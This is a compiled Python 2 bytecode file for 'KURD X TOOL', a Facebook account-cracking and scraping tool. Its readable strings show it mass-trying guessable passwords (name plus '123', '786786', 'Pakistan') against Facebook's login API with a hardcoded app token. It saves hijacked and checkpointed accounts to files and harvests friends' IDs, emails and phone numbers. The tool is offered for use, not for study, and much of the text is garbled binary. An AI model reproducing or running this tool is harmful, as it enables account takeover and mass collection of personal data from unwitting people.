ó
ÿc           @   s¢  e  Z e r# d  d  Z   Z n  yÜ d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 d d l
 Z
 d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l m Z d d l m Z d d l m Z Wn8 e k
 r9e j d  e j d  e j d  n Xe e  e j d	  e j   Z e j e   e j e j j   d
 d d$ g e _ d   Z  d   Z! d   Z" d   Z# d   Z$ d Z% d   Z& d  Z' g  Z( g  Z) g  Z* g  a+ g  Z, g  Z- g  Z. g  Z/ g  Z0 d   Z1 d   Z2 d   Z3 d   Z4 d   Z5 d   Z6 d   Z7 d   Z8 d   Z9 d   Z: d   Z; d    Z< d!   Z= d"   Z> e? d# k re1   n  d S(%   i    iÿÿÿÿN(   t
   ThreadPool(   t   ConnectionError(   t   Browsers   pip2 install requestss   pip2 install mechanizes   python2 kurdxtool.pyt   utf8t   max_timei   s
   User-Agentsn   Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36c           C   s   d GHt  j j   d  S(   Ns   [!] Exit(   t   ost   syst   exit(    (    (    s   888794911o.pyR      s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   888794911o.pyt   acak#   s
    0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   t   stdoutt   write(   R   R   R   t   jR   (    (    s   888794911o.pyR   +   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¸ëQ¸?(   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   888794911o.pyt   hamza5   s    c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¹?(   R   R   R   R   R   R   (   R   R   (    (    s   888794911o.pyt   hopss:   s    s}  
[1;92m  ââââââââââââââââââââââ
  [1;92mââââââââââââââââââââââ
  [1;92mââââââââââââââââââââââ
  [1;92mââââââââââââââââââââââ
  [1;92mââââââââââââââââââââââ
 [1;91m-----------------------------------------------
 [1;92mâ£ OWNER    : Kurdistan007
 [1;92mâ£ Dev           : BiyarHussein
 [1;92mâ£ Facebook : BiyarHussein
 [1;92mâ£ Telegarm : Biyar007
 [1;91m-----------------------------------------------c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s   [â] Logging In i   (   R   R   R   R   R   (   t   titikt   o(    (    s   888794911o.pyt   tikM   s
      c          C   s  t  j d  y t d d  j   }  WnJ t k
 rr t  j d  d GHt  j d  t j d  t  j d  n Xy= t j d |   } t	 j
 | j  } | d	 } | d
 } Wnr t k
 rü t  j d  d GHt  j d  t j d  t  j d  n) t j j k
 r$d GHt j d  n Xt  j d  t GHd | GHd | GHd d GHd GHd GHd GHd GHd GHd GHd GHd GHt   d  S(   Nt   clears	   login.txtt   rs   [!] Token Not Founds   rm -rf login.txti   s   python2 kurdxtool.pys+   https://graph.facebook.com/me?access_token=t   namet   ids   [!] Account Is On Checkpoints   [!] No Connections   |[â] Name: s   |[â] ID  : i/   t   -s   [1] Start Cloning.s   [2] Clone With Pass Choice.s   [3] Grabbing Tools.s   [4] Auto Del Tools.s   [5] Update KURD X TOOLs   [6] Follow Me On Facebook.s
   [7] Logouts                     (   R   t   systemt   opent   readt   IOErrorR   R   t   requestst   gett   jsont   loadst   textt   KeyErrort
   exceptionsR   t   bannert   men(   t   tokett   otwt   aR'   R(   (    (    s   888794911o.pyt   menu^   sL    
			c          C   su  t  d  }  |  d k r' d GHt   nJ|  d k r= t   n4|  d k r} t j d  t d  t j d  t j d	  nô |  d
 k r t   nÞ |  d k r© t	   nÈ |  d k rt j d  t
 GHt d  t j d  t d  t d  t j d  t j d  nb |  d k r2t j d  t   n? |  d k ret j d  t d  t j d  n d GHt   d  S(   Ns   Choose Option >>  R	   s    Wrong Inputt   1t   2R%   s%   [!] Please Wait While Page Is Loding.s   python2 .byokurd.pyi   t   3t   4t   5s(   [â] Please Wait While Tool Is Updatings   git pull origin masters'   [â] Tool Has Been Update SuccessfullysA   [â] Please Wait While Update Is Setting Up On Your Mobile Phonei   s   python2 kurdxtool.pyt   6s   xdg-open https://t.me/Biyar007t   7s   rm -rf login.txts   [â] Logged Out Successfullys   [!] Wrong Input(   t	   raw_inputR6   t   crackR   R*   R    R   R   t   grabt   botR5   R:   (   t   rana(    (    s   888794911o.pyR6      sB    









c           C   s   t  j d  y t d d  j   a Wn= t k
 re d GHt  j d  t j d  t  j d  n Xt  j d  t GHd GHd	 GHd
 GHd GHt	   d  S(   NR%   s	   login.txtR&   s   Token invalids   rm -rf login.txti   s   python2 kurdxtool.pys   [1] Clone From Friendlist.s   [2] Clone From Any Public ID.s   [3] Clone From File.s	   [0] Back.(
   R   R*   R+   R,   R7   R-   R   R   R5   t
   crack_menu(    (    (    s   888794911o.pyRC   «   s    c          C   s7  t  d  }  |  d k r' d GHt   n	|  d k r t j d  t GHt j d t  } t j	 | j
  } xÃ| d D] } t j | d  qu Wn|  d	 k rt j d  t GHt  d
  } yC t j d | d t  } t j	 | j
  } t d | d  Wn' t k
 r)d GHt  d  t   n Xt j d | d t  } t j	 | j
  } xÖ | d D] } t j | d  qbWn° |  d k rt j d  t GHyC t  d  } x0 t | d  j   D] }	 t j |	 j    qÃWWq0t k
 r
d GHt  d  t   q0Xn" |  d k r$t   n d GHt   t d t t t    t j d  t d  t j d  t d  t j d  d d GHd   }
 t d   } | j |
 t  d! GHt d"  t d#  t t t   } t t t   } d$ t t t   d% t t t   GHd d GHt  d&  t   d  S('   Ns   Choose Option >>  R	   s   [!] Filled IncorrectlyR;   R%   s3   https://graph.facebook.com/me/friends?access_token=t   dataR(   R<   s   [+] Input ID: s   https://graph.facebook.com/s   ?access_token=s*   [1;97m[â] Account Name [1;97m:[1;97m R'   s   [!] ID Not Found!s   
Press Enter To Back  s   /friends?access_token=R=   s   [+] File Name: R&   s   [!] File Not Found.s   Press Enter To Back. t   0s   Filled Incorrectlys   [â] Total Friends: g      à?s#   [â] The Process Has Been Started.s%   [!] To Stop Process Press CTRL Then Zi/   R)   c         S   s  |  } y t  j d  Wn t k
 r* n Xyåt j d | d t  } t j | j  } d } t	 j
 d | d | d  } t j |  } d | k rÀ d	 | d
 | GHt j | |  nOd | d k r'd | d | GHt d d  } | j | d | d  | j   t j | |  nèd } t	 j
 d | d | d  } t j |  } d | k rd	 | d
 | GHt j | |  nd | d k ród | d | GHt d d  } | j | d | d  | j   t j | |  nd }	 t	 j
 d | d |	 d  } t j |  } d | k rXd	 | d
 |	 GHt j | |	  n·d | d k r¿d | d |	 GHt d d  } | j | d |	 d  | j   t j | |	  nP| d d }
 t	 j
 d | d |
 d  } t j |  } d | k r,d	 | d
 |
 GHt j | |
  nãd | d k rd | d |
 GHt d d  } | j | d |
 d  | j   t j | |
  n|| d d } t	 j
 d | d | d  } t j |  } d | k r d	 | d
 | GHt j | |  nd | d k rgd | d | GHt d d  } | j | d | d  | j   t j | |  n¨| d d } t	 j
 d | d | d  } t j |  } d | k rÔd	 | d
 | GHt j | |  n;d | d k r;d | d | GHt d d  } | j | d | d  | j   t j | |  nÔ | d d } t	 j
 d | d | d  } t j |  } d | k r¨d	 | d
 | GHt j | |  ng d | d k rd | d | GHt d d  } | j | d | d  | j   t j | |  n  Wn n Xd  S(   Nt   saves   https://graph.facebook.com/s   /?access_token=t   786786s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6t   access_tokens)   [1;96m[[1;96mSuccessful[1;96m][1;96m s    [1;96m|[1;96m s   www.facebook.comt	   error_msgs)   [1;91m[[1;91mCheckpoint[1;91m][1;91m s    [1;91m|[1;91m s   save/checkpoint.txtR9   t   |s   
t   Pakistant   000786t
   first_namet   123t   12345t   1122t   786(   R   t   mkdirt   OSErrorR.   R/   R7   R0   R1   R2   t   urllibt   urlopent   loadt   okst   appendR+   R   t   closet
   checkpoint(   t   argt   userR9   R   t   pass1RH   t   qt   crtt   pass2t   pass3t   pass4t   pass5t   pass6t   pass7(    (    s   888794911o.pyt   mainù   s¼    






i   s5   [1;97m----------------------------------------------s!   [â] Process Has Been Completed.s+   [1;97m[â] Checkpoint IDS Has Been Saved.s)   [â] Total [1;32mOK/[1;97mCP : [1;32ms   /[1;97ms   
Press Enter To Back (   RB   RG   R   R*   R5   R.   R/   R7   R0   R1   R2   R(   R\   R    R3   RC   R+   t	   readlinest   stripR-   R:   R   R   R   R   R    t   mapR[   R^   (   t   crmR&   R   t   st   idtt   jokt   opR   t   idlistt   lineRj   t   pt   xxt   xxx(    (    s   888794911o.pyRG   ½   sz    





		s

)	
c          C   s   t  j d  y t d d  j   }  Wn= t k
 re d GHt  j d  t j d  t  j d  n Xt  j d  t GHd GHd	 GHd
 GHd GHd GHt   d  S(   NR%   s	   login.txtR&   s   [!] Token Not Founds   rm -rf login.txti   s   python2 kurdxtool.pys'   [1] Extract Numeric IDs From Public ID.s#   [2] Extract Email's From Public ID.s(   [3] Extract Phone Number From Public ID.s	   [0] Back.s
             (	   R   R*   R+   R,   R-   R   R   R5   t	   grab_menu(   R7   (    (    s   888794911o.pyRD   |  s     c          C   s   t  d  }  |  d k r' d GHt   nd |  d k r= t   nN |  d k rS t   n8 |  d k ri t   n" |  d k r t   n d GHt   d  S(	   Ns   
Choose Option >> R	   s    Wrong InputR;   R<   R=   RI   s   [!] Wrong input(   RB   Rx   t   idfromfriendt   emailfromfriendt   numberfromfriendR:   (   t   grm(    (    s   888794911o.pyRx     s    




c    	      C   sÅ  t  j d  y t d d  j   }  Wn0 t k
 rX d GHt  j d  t j d  n Xy t  j d  Wn t k
 r} n Xyt  j d  t	 GHt
 d  } y> t j d	 | d
 |   } t j | j  } d | d GHWn' t k
 rd GHt
 d  t   n Xt j d	 | d |   } t j | j  } t d  d GHt d d  } xv | d d D]f } t j | d  | j | d d  d t t t   d | d Gt j j   t j d  qaW| j   d GHd t t t   GHt
 d  } d | GHt
 d  t   Wn¨ t k
 r?d  GHt
 d  t   n t t f k
 rkd! GHt
 d  t   nV t k
 rd" GHt
 d  t   n0 t j j k
 rÀd# GHt j d  t   n Xd  S($   NR%   s	   login.txtR&   s   [!] Token Not Founds   rm -rf login.txti   RJ   s   [+] Input ID : s   https://graph.facebook.com/s   ?access_token=s   [â] Account Name : R'   s   [!] Friend Not Founds   Press Enter To Back s)   ?fields=friends.limit(5000)&access_token=s$   [â] Getting Friends Numeric IDs...s&   --------------------------------------s   save/id.txtR   t   friendsRH   R(   s   
s   [s    ] => gü©ñÒMbP?s&   [â] The Process Has Been Completed.s   [â] Total IDs Founded : s   [?] Save File With Name : s'   [â] The File Has Been Saved As save/s   
Press Enter To Back s   [!] Error While Creating files   [!]The Process Has Been Stoppeds	   [!] Errors   [â] No Connection(    R   R*   R+   R,   R-   R   R   RV   RW   R5   RB   R.   R/   R0   R1   R2   R3   RD   R    t   idhR\   R   R   R   R   R   R   R]   t   KeyboardInterruptt   EOFErrorR4   R   (	   R7   Rp   Rq   Rr   R&   R   t   bzR9   t   done(    (    s   888794911o.pyRy   £  st    

   
	






c          C   s0  t  j d  y t d d  j   }  Wn= t k
 re d GHt  j d  t j d  t  j d  n Xy t  j d  Wn t k
 r n Xyöt  j d  t	 GHt
 d	  } y> t j d
 | d |   } t j | j  } d | d GHWn' t k
 rd GHt
 d  t   n Xt j d
 | d |   } t j | j  } t d  d d GHt d d  } xË | d D]¿ } t j d
 | d d |   } t j | j  }	 yt t j |	 d  | j |	 d d  d t t t   d |	 d d |	 d d Gt j j   t j d  Wqnt k
 r,qnXqnW| j   d GHd GHd  t t t   GHt
 d!  }
 d" |
 GHt
 d#  t   Wn¨ t k
 rªd$ GHt
 d  t   n t t f k
 rÖd% GHt
 d  t   nV t k
 rüd& GHt
 d  t   n0 t j j k
 r+d' GHt j d  t   n Xd  S((   NR%   s	   login.txtR&   s   [!] Token Not Founds   rm -rf login.txti   s   python2 kurdxtool.pyRJ   s   [+] Input ID : s   https://graph.facebook.com/s   ?access_token=s   [â] Account Name : R'   s   [!] Account Not Founds   
Press Enter To Back s   /friends?access_token=s   [â] Getting Emails Fromi(   s   [1;97m-s   save/email.txtR   RH   R(   t   emails   
s   [1;97m[ [1;97ms   [1;97m ][1;97m  [1;97ms    | g-Cëâ6?s"   ----------------------------------s#   [â] Successfully Extracted Mailss   [â] Total Mail Founded : s9   [1;97m[â] [1;97mSave File With Name[1;97m :[1;97m s%   [â] File Has Been Saved As : save/s   
Press Enter  To Back s   [!] Error While Creating files   [!] Process Has Been Stoppeds	   [!] Errors   [1;97m[â] No Connection(    R   R*   R+   R,   R-   R   R   RV   RW   R5   RB   R.   R/   R0   R1   R2   R3   RD   R    t   emfromfriendR\   R   R   R   R   R   R   R]   R   R   R4   R   (   R7   Rp   Rq   Rr   R&   R9   R   R   R   R   R   (    (    s   888794911o.pyRz   Þ  s    

	0  
	






c          C   s+  t  j d  y t d d  j   }  Wn= t k
 re d GHt  j d  t j d  t  j d  n Xy t  j d  Wn t k
 r n Xyñt  j d  t	 GHt
 d	  } y> t j d
 | d |   } t j | j  } d | d GHWn' t k
 rd GHt
 d  t   n Xt j d
 | d |   } t j | j  } t d  d d GHt d d  } xË | d D]¿ } t j d
 | d d |   } t j | j  }	 yt t j |	 d  | j |	 d d  d t t t   d |	 d d |	 d d Gt j j   t j d  Wqnt k
 r,qnXqnW| j   d GHd t t t   GHt
 d   }
 d! |
 GHt
 d  t   Wn¨ t k
 r¥d" GHt
 d  t   n t t f k
 rÑd# GHt
 d$  t   nV t k
 r÷d% GHt
 d  t   n0 t j j k
 r&d& GHt j d  t   n Xd  S('   NR%   s	   login.txtR&   s   [!] Token Not Founds   rm -rf login.txti   s   python2 kurdxtool.pyRJ   s   [+] Input ID : s   https://graph.facebook.com/s   ?access_token=s   [â] Account Name : R'   s   [!] Friend Not Founds   
Press Enter To Back s   /friends?access_token=s   [â] Getting All Numbersi(   s   [1;97m-s   save/number.txtR   RH   R(   t   mobile_phones   
s   [1;97m[ [1;97ms   [1;97m ][1;97m [1;97ms    | gü©ñÒMbP?s#   -----------------------------------s   [â] Total Number Founded : s   [?] Save File With Name: s#   [â] File Has Been Saved As save/s   [!] Error While Creating files   [!]The Process Has Been Stoppeds   
Press Enter To Backs	   [!] Errors   
[â] No Connection(    R   R*   R+   R,   R-   R   R   RV   RW   R5   RB   R.   R/   R0   R1   R2   R3   RD   R    t   nofromfriendR\   R   R   R   R   R   R   R]   R   R   R4   R   (   R7   Rp   Rq   Rr   R&   R9   R   R   R   R   R   (    (    s   888794911o.pyR{   !  s~    

	0  
	






c          C   s   t  j d  y t d d  j   }  Wn= t k
 re d GHt  j d  t j d  t  j d  n Xt  j d  t GHd GHd	 GHd
 GHd GHd GHt   d  S(   NR%   s	   login.txtR&   s   [!] Token not founds   rm -rf login.txti   s   python2 kurdxtool.pys   [1] Auto Delete Posts.s    [2] Auto Accept Friend Requests.s   [3] Auto Unfriend All.s	   [0] Back.s	            (	   R   R*   R+   R,   R-   R   R   R5   t   bot_menu(   R7   (    (    s   888794911o.pyRE   b  s     c          C   s   t  d  }  |  d k r' d GHt   nd |  d k r= t   nN |  d k rS t   n8 |  d k ri t   n" |  d k r t   n d GHt   d  S(   Ns   
Choose Option >> R	   s   [!] Wrong InputR;   R<   R=   RI   (   RB   R   t
   deletepostt   acceptt   unfriendR:   (   t   bots(    (    s   888794911o.pyR   t  s    




c          C   sû  t  j d  yH t d d  j   }  t j d |   } t j | j  } | d } Wn= t	 k
 r d GHt  j d  t
 j d  t  j d	  n Xt  j d  t GHd
 t GHt d  d d GHt j d |   } t j | j  } xí | d D]á } | d } d } t j d | d |   }	 t j |	 j  }
 y3 |
 d d } d | d  j d d  d d GHWqó t k
 r§d | d  j d d  d d GH| d 7} qó t j j k
 rÓd GHt d  t   qó Xqó Wd d GHd  GHt d  t   d  S(!   NR%   s	   login.txtR&   s+   https://graph.facebook.com/me?access_token=R'   s   [!] Token Not Founds   rm -rf login.txtg¹?s   python2 kurdxtool.pys   [â] Account Name : s"   [â] The Process Has Been Startedi(   R)   s0   https://graph.facebook.com/me/feed?access_token=RH   R(   i    s   https://graph.facebook.com/s   ?method=delete&access_token=t   errort   messages   [1;97m[[1;97mi
   s   
t    s   ...s   [1;97m] [1;97m[!] Faileds   [1;97m [1;97[â] [Deleted]i   s   [1;91m[!] Connection Errors   
Press Enter To Back s&   [â] The Process Has Been Completed. (   R   R*   R+   R,   R.   R/   R0   R1   R2   R-   R   R   R5   t   namaR    R   t	   TypeErrorR4   R   RB   RE   (   R7   t   namt   lolR'   t   asut   asusRu   R(   t   pirot   urlt   okR   (    (    s   888794911o.pyR     sJ    	
	
%!
	
c          C   s  t  j d  y t d d  j   }  Wn= t k
 re d GHt  j d  t j d  t  j d  n Xt  j d  t GHt d  } t	 j
 d	 | d
 |   } t j | j  } d t | d  k rà d GHt d  t   n  t d  d d GHx~ | d D]r } t	 j d | d d d |   } t j | j  } d t |  k r_d | d d GHqþ d | d d GHqþ Wd d GHd GHt d  t   d  S(   NR%   s	   login.txtR&   s   [!] Token Not Founds   rm -rf login.txti   s   python2 kurdxtool.pys%   [+] Enter Limit To Accept Requests : s3   https://graph.facebook.com/me/friendrequests?limit=s   &access_token=s   []RH   s   No friend Requests   Press Enter To Back s    [â] The Process Has Been Starti(   R)   s&   https://graph.facebook.com/me/friends/t   fromR(   s   ?access_token=R   s   [!] [Failed] | R'   s   [!] [Accepted] |  s%   [â] The Process Has Been Completed.s   
Press Enter To Back (   R   R*   R+   R,   R-   R   R   R5   RB   R.   R/   R0   R1   R2   R   RE   R    t   post(   R7   t   limitR&   t   temanR   t   gasR9   (    (    s   888794911o.pyR   °  s:    


	#	
c          C   sX  t  j d  y t d d  j   }  Wn= t k
 re d GHt  j d  t j d  t  j d  n Xt  j d  t GHt d  d	 GHd
 d GHyt t	 j
 d |   } t j | j  } xH | d D]< } | d } | d } t	 j d | d |   d | GHqÃ WWn7 t k
 rn' t k
 r=d GHt d  t   n Xd GHt d  t   d  S(   NR%   s	   login.txtR&   s   [!] Token Not Founds   rm -rf login.txti   s   python2 kurdxtool.pys#   [â] The Process Has Been Started.s#   [â] Press CTRL Z to Stop Process.i2   R)   s3   https://graph.facebook.com/me/friends?access_token=RH   R'   R(   s*   https://graph.facebook.com/me/friends?uid=s   &access_token=s   [â] [Unfriended] | s   [!]The Process Has Been Stoppeds   
 Press Enter To Back s%   [â] The Process Has Been Completed.s   Press Enter To Back (   R   R*   R+   R,   R-   R   R   R5   R    R.   R/   R0   R1   R2   t   deletet
   IndexErrorR   RB   RE   (   R7   t   pekt   cokR   R'   R(   (    (    s   888794911o.pyR   Ñ  s<    
	

 

t   __main__(   s
   User-Agentsn   Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36(@   t   Falset   foot   barR   R   R   t   datetimeR   t   hashlibt   ret	   threadingR0   RX   t	   cookielibt   getpasst	   mechanizeR.   t   multiprocessing.poolR    t   requests.exceptionsR   R   t   ImportErrorR*   t   reloadt   setdefaultencodingt   brt   set_handle_robotst   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R    R!   R5   R$   t   backt   threadst
   successfulR^   R[   t   gagalR~   R(   R   R   R:   R6   RC   RG   RD   Rx   Ry   Rz   R{   RE   R   R   R   R   t   __name__(    (    (    s   888794911o.pyt   <module>   sf   
¨
			
				(	%		¿			;	C	A			(	!	